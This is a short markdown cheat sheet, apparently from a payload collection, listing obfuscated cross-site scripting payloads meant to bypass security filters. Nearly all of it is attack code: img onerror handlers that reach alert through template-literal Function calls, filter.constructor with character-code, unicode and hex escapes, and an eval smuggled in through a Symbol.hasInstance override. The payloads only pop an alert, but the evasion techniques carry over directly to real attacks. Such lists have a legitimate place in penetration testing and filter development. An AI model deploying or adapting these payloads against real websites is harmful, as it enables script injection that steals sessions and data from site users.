# Obfuscated XSS

The art of hiding Cross-Site Scripting (XSS) payloads to bypass security filters.

Goodbye!

```
<img src onerror=alert`1`>
```

----------

### Basic without Eval

```
<img src onerror="Function`al\x65rt\x281\x29`()">
```

### filter.constructor

```
<img src onerror="[].filter.constructor('('+('al'+'ert')+')(1)')()">
<img src onerror="[].filter.constructor(''+String.fromCharCode(97,108,101,114,116)+'(1)')()">
<img src onerror="[].filter.constructor('\u0061\u006c\u0065\u0072\u0074(1)')()">
<img src onerror="[].filter.constructor('\x61\x6c\x65\x72\x74(1)')()">
```

### Indirect function call obfuscation with Symbol.hasInstance abuse and instanceof override

```
<img src=x onerror="([][Symbol.hasInstance]=eval,[]instanceof{[Symbol.hasInstance](){('al'+'ert')(0)}})">
```
